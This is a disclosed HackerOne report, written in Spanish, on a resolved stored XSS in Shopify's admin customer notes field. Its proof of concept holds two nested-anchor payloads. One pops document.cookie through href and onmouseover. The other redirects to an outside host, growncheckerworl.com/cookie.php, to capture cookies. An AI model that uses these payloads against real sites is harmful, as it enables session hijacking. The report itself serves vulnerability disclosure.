---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '798599'
original_report_id: '798599'
title: xss stored
weakness: Cross-site Scripting (XSS) - Stored
team_handle: shopify
created_at: '2020-02-18T03:32:35.642Z'
disclosed_at: '2020-04-03T07:27:26.531Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 73
asset_identifier: '*.shopify.com'
asset_type: WILDCARD
max_severity: medium
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# xss stored

## Metadata

- HackerOne Report ID: 798599
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: shopify
- Disclosed At: 2020-04-03T07:27:26.531Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Se encuentra un xss en las notas del cliente se requiere inicio de session, se encuentra en el campo notas de cliente

POC

https://macken22jorg.myshopify.com/admin/customers
https://macken22jorg.myshopify.com/admin/customers/2901321318444


<h1>holaaaaaaa||<a href="http://<a href="http://<a href="http://<a href="javascript:alert(document.cookie)" onmouseover="javascript:alert(document.cookie)">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">gle.com</a>  hhh

<h1>holaaaaaaa||<a href="http://<a href="http://<a href="http://<a href="javascript:window.location='https://growncheckerworl.com/cookie.php?cookie=document.cookie'" >aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">gle.com</a>  hhhk



Referencias:

https://www.imperva.com/learn/application-security/cross-site-scripting-xss-attacks/

## Impact

captura de cookies

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
